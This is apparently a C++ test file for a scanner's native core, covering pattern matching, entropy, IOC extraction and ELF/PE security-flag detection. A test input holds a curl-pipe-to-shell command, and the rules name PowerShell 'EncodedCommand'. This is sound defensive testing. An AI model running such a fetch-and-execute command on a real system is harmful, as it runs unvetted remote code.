/*
 * Standalone tests for the native core.
 *
 *   g++ -std=c++17 -O2 native/torvex_core.cpp native/test_native.cpp -o /tmp/t && /tmp/t
 *
 * These are intentionally independent of Cargo: the C++ layer must be testable
 * on its own so a broken ABI is obvious before Rust is involved.
 */

#include "torvex_core.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

namespace {

int failures = 0;
int checks = 0;

void check(bool condition, const char *expression, int line) {
    checks++;
    if (!condition) {
        failures++;
        std::fprintf(stderr, "FAIL line %d: %s\n", line, expression);
    }
}

#define CHECK(expr) check((expr), #expr, __LINE__)

bool contains(const std::string &haystack, const char *needle) {
    return haystack.find(needle) != std::string::npos;
}

struct MatcherGuard {
    tv_matcher *handle = tv_matcher_create();
    ~MatcherGuard() { tv_matcher_destroy(handle); }
};

void add(tv_matcher *matcher, const char *id, bool require_all,
         const std::vector<std::string> &patterns, const std::vector<int> &nocase) {
    std::vector<const char *> pointers;
    std::vector<size_t> lengths;
    for (const auto &pattern : patterns) {
        pointers.push_back(pattern.data());
        lengths.push_back(pattern.size());
    }
    const int rc = tv_matcher_add_rule(matcher, id, require_all ? 1 : 0, pointers.data(),
                                       lengths.data(), nocase.empty() ? nullptr : nocase.data(),
                                       pointers.size());
    CHECK(rc == 0);
}

std::string scan_bytes(tv_matcher *matcher, const std::string &data) {
    char *result =
        tv_scan(matcher, reinterpret_cast<const uint8_t *>(data.data()), data.size());
    std::string copy = result == nullptr ? "" : result;
    tv_free(result);
    return copy;
}

void test_multi_pattern_single_pass() {
    MatcherGuard guard;
    add(guard.handle, "R-ONE", false, {"alpha", "beta"}, {});
    add(guard.handle, "R-TWO", false, {"gamma"}, {});
    CHECK(tv_matcher_build(guard.handle) == 0);
    CHECK(tv_matcher_rule_count(guard.handle) == 2);

    const std::string json = scan_bytes(guard.handle, "beta alpha gamma");
    CHECK(contains(json, "\"id\":\"R-ONE\""));
    CHECK(contains(json, "\"id\":\"R-TWO\""));
    CHECK(!contains(json, "\"id\":\"R-NONE\""));
}

void test_require_all() {
    MatcherGuard guard;
    add(guard.handle, "R-ALL", true, {"needle-a", "needle-b"}, {});
    CHECK(tv_matcher_build(guard.handle) == 0);

    CHECK(!contains(scan_bytes(guard.handle, "only needle-a here"), "R-ALL"));
    CHECK(contains(scan_bytes(guard.handle, "needle-b then needle-a"), "R-ALL"));
}

void test_case_sensitivity() {
    MatcherGuard guard;
    add(guard.handle, "R-CASE", false, {"PowerShell"}, {});
    add(guard.handle, "R-NOCASE", false, {"EncodedCommand"}, {1});
    CHECK(tv_matcher_build(guard.handle) == 0);

    CHECK(!contains(scan_bytes(guard.handle, "powershell"), "R-CASE"));
    CHECK(contains(scan_bytes(guard.handle, "PowerShell"), "R-CASE"));
    CHECK(!contains(scan_bytes(guard.handle, "POWERSHELL"), "R-CASE"));
    CHECK(contains(scan_bytes(guard.handle, "powershell -encodedcommand"), "R-NOCASE"));
    CHECK(contains(scan_bytes(guard.handle, "ENCODEDCOMMAND"), "R-NOCASE"));
}

void test_entropy() {
    MatcherGuard guard;
    CHECK(tv_matcher_build(guard.handle) == 0);

    const std::string zeros(4096, '\0');
    const std::string json = scan_bytes(guard.handle, zeros);
    CHECK(contains(json, "\"entropy\":0.0000"));

    std::string varied;
    for (int index = 0; index < 4096; ++index) {
        varied.push_back(static_cast<char>(index % 256));
    }
    const std::string varied_json = scan_bytes(guard.handle, varied);
    CHECK(contains(varied_json, "\"entropy\":8.0000"));
}

void test_base64_run() {
    MatcherGuard guard;
    CHECK(tv_matcher_build(guard.handle) == 0);
    const std::string blob(300, 'A');
    const std::string json = scan_bytes(guard.handle, "!" + blob + "!");
    CHECK(contains(json, "\"longest_base64_run\":300"));
}

void test_iocs() {
    MatcherGuard guard;
    CHECK(tv_matcher_build(guard.handle) == 0);
    const std::string text =
        "contact admin@example.org or visit https://evil.example/path?q=1 from 203.0.113.9";
    const std::string json = scan_bytes(guard.handle, text);
    CHECK(contains(json, "\"type\":\"url\""));
    CHECK(contains(json, "https://evil.example/path?q=1"));
    CHECK(contains(json, "\"type\":\"email\""));
    CHECK(contains(json, "admin@example.org"));
    CHECK(contains(json, "\"type\":\"ipv4\""));
    CHECK(contains(json, "203.0.113.9"));
}

std::string make_elf_wx() {
    std::string elf(256, '\0');
    elf[0] = 0x7F;
    elf[1] = 'E';
    elf[2] = 'L';
    elf[3] = 'F';
    elf[4] = 2; /* ELFCLASS64 */
    elf[5] = 1; /* little endian */
    elf[6] = 1; /* version */
    elf[16] = 2; /* ET_EXEC */
    elf[18] = 0x3E;
    elf[19] = 0;
    /* e_phoff = 64 */
    elf[32] = 64;
    /* e_phentsize = 56 */
    elf[54] = 56;
    /* e_phnum = 1 */
    elf[56] = 1;
    /* program header at 64: PT_LOAD, flags R|W|X */
    const size_t ph = 64;
    elf[ph + 0] = 1;
    elf[ph + 4] = 7;
    /* p_vaddr = 0x400000 */
    elf[ph + 16] = 0x00;
    elf[ph + 18] = 0x40;
    /* p_memsz = 0x1000 */
    elf[ph + 40] = 0x00;
    elf[ph + 41] = 0x10;
    return elf;
}

void test_elf_structure() {
    MatcherGuard guard;
    CHECK(tv_matcher_build(guard.handle) == 0);
    const std::string json = scan_bytes(guard.handle, make_elf_wx());
    CHECK(contains(json, "\"kind\":\"elf64\""));
    CHECK(contains(json, "TVX-STRUCT-ELF-WX"));
    CHECK(contains(json, "TVX-STRUCT-ELF-NO-PIE"));
    CHECK(contains(json, "TVX-STRUCT-ELF-NO-RELRO"));
    CHECK(contains(json, "TVX-STRUCT-ELF-NO-GNU-STACK"));
}

std::string make_pe_rwx() {
    std::string pe(0x400, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    /* e_lfanew = 0x40 */
    pe[0x3C] = 0x40;
    std::memcpy(&pe[0x40], "PE\0\0", 4);
    pe[0x44] = 0x64; /* machine = 0x8664 */
    pe[0x45] = 0x86;
    pe[0x46] = 1; /* one section */
    pe[0x54] = 0xF0; /* SizeOfOptionalHeader = 240 for PE32+ */
    pe[0x56] = 0x22; /* executable image */
    pe[0x58] = 0x0B; /* PE32+ magic 0x20B */
    pe[0x59] = 0x02;
    /* DllCharacteristics at optional+70 left as zero: no ASLR, NX, CFG. */
    const size_t section = 0x58 + 0xF0;
    std::memcpy(&pe[section], ".text", 5);
    pe[section + 16] = 0x00; /* SizeOfRawData = 0x100 */
    pe[section + 17] = 0x01;
    pe[section + 20] = 0x00; /* PointerToRawData = 0x200 */
    pe[section + 21] = 0x02;
    pe[section + 36] = 0x20; /* MEM_EXECUTE | MEM_WRITE | MEM_READ */
    pe[section + 37] = 0x00;
    pe[section + 38] = 0x00;
    pe[section + 39] = 0xE0;
    return pe;
}

void test_pe_structure() {
    MatcherGuard guard;
    CHECK(tv_matcher_build(guard.handle) == 0);
    const std::string json = scan_bytes(guard.handle, make_pe_rwx());
    CHECK(contains(json, "\"kind\":\"pe32+\""));
    CHECK(contains(json, "TVX-STRUCT-PE-RWX"));
    CHECK(contains(json, "TVX-STRUCT-PE-NO-ASLR"));
    CHECK(contains(json, "TVX-STRUCT-PE-NO-NX"));
}

void test_script_and_binary_safety() {
    MatcherGuard guard;
    CHECK(tv_matcher_build(guard.handle) == 0);
    const std::string json = scan_bytes(guard.handle, "#!/bin/bash\ncurl http://x/y | sh\n");
    CHECK(contains(json, "\"kind\":\"script\""));
    CHECK(contains(json, "TVX-STRUCT-SCRIPT"));

    /* Truncated headers must not crash or read out of bounds. */
    for (size_t length = 0; length < 64; ++length) {
        const std::string elf = make_elf_wx().substr(0, length);
        const std::string pe = make_pe_rwx().substr(0, length);
        scan_bytes(guard.handle, elf);
        scan_bytes(guard.handle, pe);
    }
    CHECK(true);
}

void test_invalid_inputs() {
    CHECK(tv_matcher_build(nullptr) != 0);
    CHECK(tv_scan(nullptr, nullptr, 0) == nullptr);
    CHECK(tv_matcher_rule_count(nullptr) == 0);
    tv_matcher_destroy(nullptr);
    tv_free(nullptr);

    MatcherGuard guard;
    const char *needle = "";
    const size_t length = 0;
    CHECK(tv_matcher_add_rule(guard.handle, "bad", 0, &needle, &length, nullptr, 1) != 0);
}

} /* namespace */

int main() {
    test_multi_pattern_single_pass();
    test_require_all();
    test_case_sensitivity();
    test_entropy();
    test_base64_run();
    test_iocs();
    test_elf_structure();
    test_pe_structure();
    test_script_and_binary_safety();
    test_invalid_inputs();

    std::printf("%d checks, %d failures\n", checks, failures);
    return failures == 0 ? 0 : 1;
}
